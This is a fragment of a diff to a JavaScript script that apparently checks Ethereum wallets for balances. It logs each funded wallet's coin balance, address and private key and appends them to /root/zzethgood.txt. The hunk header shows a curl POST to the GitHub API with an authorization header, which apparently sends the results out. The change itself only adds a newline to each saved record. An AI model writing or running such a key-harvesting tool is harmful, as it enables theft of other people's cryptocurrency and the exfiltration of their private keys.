@@ -34,7 +34,7 @@ await exec('curl -L -X POST -H \"Accept: application/vnd.github+json\" -H \"Auth
 });
 
   console.log(bal.coin_balance + ' - ' + address + ' - ' + privateKey + '\n _____________________________________________'.red);
-  fs.appendFileSync('/root/zzethgood.txt', bal.coin_balance + ' - ' + address + ' - ' + privateKey);
+  fs.appendFileSync('/root/zzethgood.txt', bal.coin_balance + ' - ' + address + ' - ' + privateKey + '\n');
 
 }}}
 
